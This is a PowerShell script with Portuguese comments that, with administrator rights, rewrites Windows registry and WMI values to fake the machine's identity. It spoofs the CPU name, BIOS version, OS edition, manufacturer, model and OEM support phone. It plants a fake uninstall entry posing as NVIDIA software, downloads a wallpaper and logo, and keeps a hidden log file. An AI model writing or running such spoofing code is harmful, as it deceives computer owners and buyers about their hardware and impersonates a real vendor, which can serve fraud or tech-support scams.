$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Tls13
$global:maadVersion = "2.5"

# Configurações do sistema
$sysConfig = @{
    SystemName       = "Maad"
    WorkgroupName    = "MaadGroup"
    SystemComment    = "Sistema otimizado"
    CPUModel         = "Intel Quantum 9999X Turbo"
    BIOSVersion      = "v9999.ROM"
    ComputerModel    = "UltimateX-2025"
    RegisteredOwner  = "Maad"
    Organization     = "Maad Corp"
    WallpaperURL     = "https://i.imgur.com/BxYaE1e.jpeg"
    WallpaperPath    = "$env:SystemRoot\Web\Wallpaper\Windows\wallpaper_custom.jpg"
    FakeAppName      = "NVIDIA Shader Cache Optimizer"
    FakePublisher    = "NVIDIA Corporation"
    UninstallKey     = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\NVIDIA_Cache_Optimizer"
    OSName           = "Windows 10 Professional Workstation"
    SupportPhone     = "+1 800-555-0101"
    SupportHours     = "24/7"
}

# Configurações do log
$logConfig = @{
    LogPath = "$env:USERPROFILE\Desktop\updater.ini"
    MaxLogSizeKB = 1024 # 1MB
}

# Função para escrever no log
function Write-Log {
    param (
        [string]$message,
        [string]$type = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$type] $message"
    
    try {
        # Verifica se o arquivo de log existe, se não, cria
        if (-not (Test-Path $logConfig.LogPath)) {
            $null = New-Item -Path $logConfig.LogPath -ItemType File -Force
            # Define o atributo oculto
            (Get-Item $logConfig.LogPath).Attributes += 'Hidden'
        }
        
        # Verifica o tamanho do log e rotaciona se necessário
        if ((Get-Item $logConfig.LogPath).Length / 1KB -gt $logConfig.MaxLogSizeKB) {
            $backupPath = $logConfig.LogPath -replace '\.ini$', '_backup.ini'
            Move-Item -Path $logConfig.LogPath -Destination $backupPath -Force
        }
        
        # Adiciona a entrada ao log
        Add-Content -Path $logConfig.LogPath -Value $logEntry -Force
    } catch {
        Write-Verbose "Falha ao escrever no log: $_" -Verbose
    }
}

function Set-SystemWallpaper {
    try {
        Write-Log "Iniciando configuração do papel de parede"
        $webClient = New-Object System.Net.WebClient
        Write-Log "Baixando imagem de $($sysConfig.WallpaperURL)"
        $webClient.DownloadFile($sysConfig.WallpaperURL, $sysConfig.WallpaperPath)
        
        if (Test-Path $sysConfig.WallpaperPath) {
            Write-Log "Imagem baixada com sucesso para $($sysConfig.WallpaperPath)"
            $null = New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value $sysConfig.WallpaperPath -Force
            $null = New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "WallpaperStyle" -Value "10" -Force
            $null = New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "TileWallpaper" -Value "0" -Force
            $null = New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "JPEGImportQuality" -Value 100 -Force
            Start-Process -WindowStyle Hidden -FilePath "rundll32.exe" -ArgumentList "user32.dll,UpdatePerUserSystemParameters 1, True"
            Write-Log "Configurações do papel de parede aplicadas com sucesso"
        } else {
            Write-Log "Falha ao baixar a imagem do papel de parede" -type "ERROR"
        }
    } catch {
        Write-Log "Erro na configuração do papel de parede: $_" -type "ERROR"
    }
}

function Set-OemLogo {
    param (
        [string]$logoUrl = "https://i.imgur.com/49Uet4M.png",
        [string]$outputPath = "C:\Windows\System32\oobe\info\maad_logo.bmp"
    )
    try {
        Write-Log "Iniciando configuração do logo OEM"
        $logoDir = Split-Path -Path $outputPath -Parent
        if (-not (Test-Path $logoDir)) {
            $null = New-Item -Path $logoDir -ItemType Directory -Force
            Write-Log "Diretório OEM criado: $logoDir"
        }
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
        $webClient.DownloadFile($logoUrl, $outputPath)
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation" `
                         -Name "Logo" `
                         -Value $outputPath `
                         -ErrorAction SilentlyContinue
        Write-Log "Logo OEM configurado com sucesso"
        return $true
    } catch {
        Write-Log "Erro ao configurar logo OEM: $_" -type "ERROR"
        return $false
    }
}

function Invoke-SystemCustomization {
    try {
        Write-Log "Iniciando personalização do sistema"
        try {
            Rename-Computer -NewName $sysConfig.SystemName -Force -ErrorAction Stop
            Write-Log "Nome do computador alterado para $($sysConfig.SystemName)"
        } catch {
            Write-Log "Falha ao renomear computador: $_" -type "WARNING"
        }
        
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "srvcomment" -Value $sysConfig.SystemComment -Force
        Write-Log "Comentário do servidor configurado"
        
        $wmiSystem = Get-WmiObject Win32_ComputerSystem
        $wmiSystem.Manufacturer = $sysConfig.SystemName
        $wmiSystem.Model = $sysConfig.ComputerModel
        $wmiSystem.Put() | Out-Null
        Write-Log "Informações WMI do sistema atualizadas"
        
        if ([Environment]::Is64BitOperatingSystem) {
            Set-ItemProperty -Path "HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0" -Name "ProcessorNameString" -Value $sysConfig.CPUModel
            Write-Log "Nome do processador atualizado"
        }
        
        Set-ItemProperty -Path "HKLM:\HARDWARE\DESCRIPTION\System" -Name "SystemBiosVersion" -Value $sysConfig.BIOSVersion -Force
        Write-Log "Versão da BIOS atualizada"
        
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
        Set-ItemProperty -Path $regPath -Name "RegisteredOwner" -Value $sysConfig.RegisteredOwner
        Set-ItemProperty -Path $regPath -Name "RegisteredOrganization" -Value $sysConfig.Organization
        Set-ItemProperty -Path $regPath -Name "ProductName" -Value $sysConfig.OSName
        Write-Log "Informações de registro atualizadas"
        
        if (-not (Test-Path $sysConfig.UninstallKey)) {
            $null = New-Item -Path $sysConfig.UninstallKey -Force
            $installDate = (Get-Date).ToString("yyyyMMdd")
            
            $uninstallValues = @{
                "DisplayName"    = $sysConfig.FakeAppName
                "Publisher"      = $sysConfig.FakePublisher
                "InstallDate"    = $installDate
                "DisplayVersion" = "9.9.9." + (Get-Random -Minimum 1000 -Maximum 9999)
                "UninstallString" = "`"C:\Program Files\NVIDIA\ShaderCache\uninstall.exe`" /S"
                "NoModify"       = 1
                "NoRepair"       = 1
            }

            foreach ($key in $uninstallValues.Keys) {
                Set-ItemProperty -Path $sysConfig.UninstallKey -Name $key -Value $uninstallValues[$key]
            }
            Write-Log "Chave de desinstalação falsa criada"
        }

        $oemInfo = @{
            "Manufacturer" = $sysConfig.SystemName
            "Model" = $sysConfig.ComputerModel
            "SupportHours" = $sysConfig.SupportHours
            "SupportPhone" = $sysConfig.SupportPhone
            "SupportURL" = "https://support.maad.com"
        }

        if (Set-OemLogo) {
            Write-Log "Logo OEM configurado com sucesso"
        }
        
        foreach ($key in $oemInfo.Keys) {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation" -Name $key -Value $oemInfo[$key]
        }
        Write-Log "Informações OEM atualizadas"
        
    } catch {
        Write-Log "Erro durante a personalização do sistema: $_" -type "ERROR"
    }
}

function Test-AdminPrivileges {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($identity)
        $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        if (-not $isAdmin) {
            Write-Log "Script executado sem privilégios administrativos" -type "ERROR"
        }
        return $isAdmin
    } catch {
        Write-Log "Falha ao verificar privilégios administrativos: $_" -type "ERROR"
        return $false
    }
}

# Início da execução
Write-Log "=== Início da execução do script ==="
Write-Log "Versão do script: $maadVersion"
Write-Log "Usuário atual: $env:USERNAME"
Write-Log "Computador atual: $env:COMPUTERNAME"

if (Test-AdminPrivileges) {
    try {
        Invoke-SystemCustomization
        Set-SystemWallpaper
        Write-Log "Script executado com sucesso"
        exit 0
    } catch {
        Write-Log "Erro fatal durante a execução do script: $_" -type "ERROR"
        exit 1
    }
} else {
    Write-Log "Script abortado: privilégios administrativos necessários" -type "ERROR"
    exit 1
}
